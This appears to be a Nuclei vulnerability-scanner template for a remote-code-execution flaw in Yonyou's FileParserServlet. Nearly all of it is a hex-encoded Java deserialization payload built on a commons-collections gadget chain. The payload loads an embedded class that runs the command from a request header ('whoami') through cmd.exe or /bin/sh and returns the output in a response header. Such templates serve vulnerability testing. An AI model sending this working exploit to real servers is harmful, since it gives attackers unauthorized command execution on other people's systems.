id: yonyou-FileParserServlet-rce

info:
  name: yonyou-FileParserServlet-rce
  author: yonyou-FileParserServlet-rce


http:
  - raw:
    - |
      POST /servlet/FileParserServlet HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25
      Accept-Encoding: gzip, deflate
      Testdmc: whoami
      Testecho: echo

      {{hex_decode('aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000077372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e000378707672002a6f72672e6d6f7a696c6c612e6a6176617363726970742e446566696e696e67436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400166765744465636c61726564436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00180000000074000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e0018000000027400084979726d436d4a56757200025b42acf317f8060854e0020000787000000e9ecafebabe0000003300f10a001b00640a006500660a006500670800680a004c006907006a0a0065006b08006c0a0021006d08006e08006f0700700800710800720800730700740800750700760b001200770b001200780800790a001b007a08007b07007c09001c007d0a0018007e07007f0700800a001c00810a008200830800840800850700860800870a002100880800890a0021008a08008b08008c08008d0a0021008e08008f0a009000910800920a002100930800940800950800960800970700980a003200640700990a0034009a0a0034009b0a009c009d07009e07009f0800a00a003900a10a003800a20a003800a30a003200a40a003200a50700a60a004000640a003200a70900a800a90a002100aa0a004000ab0a001800ac0700ad0a001800ae0a004700880a00af00b00a00af00b10700b20100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c6501000d537461636b4d61705461626c650700b20700860700b307007f0700740700760700b40700980700b507009e0100056765744656010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f4f626a6563743b0700b607007c0700ad01000a457863657074696f6e7301000a536f7572636546696c6501000d4979726d436d4a562e6a6176610c004d004e0700b30c00b700b80c00b900ba010007746872656164730c005c005d0100135b4c6a6176612f6c616e672f5468726561643b0c00bb00bc010004657865630c00bd00be010004687474700100067461726765740100126a6176612f6c616e672f52756e6e61626c6501000674686973243001000768616e646c6572010006676c6f62616c0100136a6176612f6c616e672f457863657074696f6e01000a70726f636573736f727301000e6a6176612f7574696c2f4c6973740c00bf00c00c00c100c20100037265710c00c300c40100076765744e6f746501000f6a6176612f6c616e672f436c6173730c00c500c60c00c700c80100106a6176612f6c616e672f4f626a6563740100116a6176612f6c616e672f496e74656765720c004d00c90700ca0c00cb00cc01000b676574526573706f6e73650100096765744865616465720100106a6176612f6c616e672f537472696e67010008546573746563686f0c004d00cd01000754657374646d630c00ce00cf010009616464486561646572010008546573744563686f010001200c00d000d10100076f732e6e616d650700d20c00d300d401000757696e646f77730c00d500d601001e433a5c5c77696e646f77735c5c73797374656d33325c5c636d642e6578650100022f630100072f62696e2f73680100022d630100176a6176612f6c616e672f537472696e674275696c6465720100186a6176612f6c616e672f50726f636573734275696c6465720c004d00d70c00d800d90700da0c00db00dc0100166a6176612f696f2f42756666657265645265616465720100196a6176612f696f2f496e70757453747265616d5265616465720100055554462d380c004d00dd0c004d00de0c00df00bc0c00e000e10c00e000e201001673756e2f6d6973632f424153453634456e636f6465720c00e300bc0700e40c00e500e60c00e700e80c00e900ea0c00eb00ec01001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e0c00ed00c40700b60c00ee00ef0c00c100f00100084979726d436d4a560100106a6176612f6c616e672f5468726561640100135b4c6a6176612f6c616e672f537472696e673b0100136a6176612f696f2f496e70757453747265616d0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b01000e67657454687265616447726f757001001928294c6a6176612f6c616e672f54687265616447726f75703b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000473697a650100032829490100036765740100152849294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b010004545950450100114c6a6176612f6c616e672f436c6173733b0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b010004284929560100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010015284c6a6176612f6c616e672f537472696e673b29560100076973456d70747901000328295a01000573706c6974010027284c6a6176612f6c616e672f537472696e673b295b4c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010016285b4c6a6176612f6c616e672f537472696e673b2956010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b01002a284c6a6176612f696f2f496e70757453747265616d3b4c6a6176612f6c616e672f537472696e673b2956010013284c6a6176612f696f2f5265616465723b2956010008726561644c696e65010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b01001c2843294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e670100216a6176612f6e696f2f636861727365742f5374616e6461726443686172736574730100055554465f3801001a4c6a6176612f6e696f2f636861727365742f436861727365743b010008676574427974657301001e284c6a6176612f6e696f2f636861727365742f436861727365743b295b42010006656e636f6465010016285b42294c6a6176612f6c616e672f537472696e673b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d6765745375706572636c61737301000d73657441636365737369626c65010004285a2956010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0021004c001b0000000000020001004d004e0001004f000003bb00080016000002c22ab70001014c014d033e2ab80002b600031204b70005c00006c00006c000063a0403360515051904bea2029419041505323a061906c602821906b600073a0719071208b600099a02711907120ab600099902672a1906120bb700053a081908c1000c9902552a2a2a1908120db70005120eb70005120fb700053a08a700083a09a702372a19081211b70005c000123a0903360a150a1909b900130100a202141909150ab9001402003a0b2a190b1215b700053a081908b60016121704bd00185903b2001953b6001a190804bd001b5903bb001c5904b7001d53b6001e3a0c190cb60016121f03bd0018b6001a190c03bd001bb6001e3a0d190cb60016122004bd0018590313002153b6001a190c04bd001b5903bb0021591222b7002353b6001ec000214d190cb60016122004bd0018590313002153b6001a190c04bd001b5903bb0021591224b7002353b6001ec000214c2cc6000a2cb6002599000e2bc601462bb600259a013f043e2cb600259a003f190db60016122605bd0018590313002153590413002153b6001a190d05bd001b5903bb0021591227b70023535904bb0021591227b7002353b6001e572bb600259a00f32b1228b600293a0e190ebe0560bd00213a0f122ab8002b3a101910122cb6002d990012190f03122e53190f04122f53a7000f190f03123053190f041231530336111511190ebea20015190f15110560190e15113253841101a7ffe9bb003259b700333a11bb003459190fb70035b60036b600373a12bb003859bb0039591912123ab7003bb7003c3a131913b6003d593a14c6001319111914b6003e100ab6003f57a7ffe8bb004059b700411911b60042b20043b60044b600453a15190db60016122605bd0018590313002153590413002153b6001a190d05bd001b5903bb0021591224b70023535904191553b6001e571d990006a70009840a01a7fde61d990006a70009840501a7fd6aa700044cb100020065007b007e0010000402bd02c0001000020050000000060001000000010051000000cb0014ff0024000607005207005307005301070006010000ff005900090700520700530700530107000601070054070053070055000107005604fd000f07005701fe00c80700550700550700550afb0044fe00380700580700580700530bfc000201fa0019fe002d07005907005a07005bfc001a070053ff004b000e0700520700530700530107000601070054070053070055070057010700550700550700550000f80006fa0005ff0006000607005207005307005301070006010000ff00050001070052000042070056000002005c005d0002004f00000075000300060000003e014e2bb600163a04190413001ba5001919042cb600464ea7000f3a051904b600483a04a7ffe52dc7000cbb0047592cb70049bf2d04b6004a2d2bb6004bb0000100100017001a004700020050000000060001000000010051000000110004fd000807005e07005f510700600b0c006100000004000100100001006200000002006374000b646566696e65436c6173737571007e001a00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00287371007e00137571007e0018000000017571007e001a0000000071007e001c7571007e001a0000000171007e001e7371007e00137571007e0018000000017571007e00180000000071007e00227571007e001a0000000171007e00247371007e000f7371007e0000770c000000103f4000000000000078737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878')}}


    extractors:
      - type: kval
        part: header
        kval:
          - Testdmc
    matchers:
      - type: dsl
        dsl:
          - "contains(all_headers,'Testdmc')"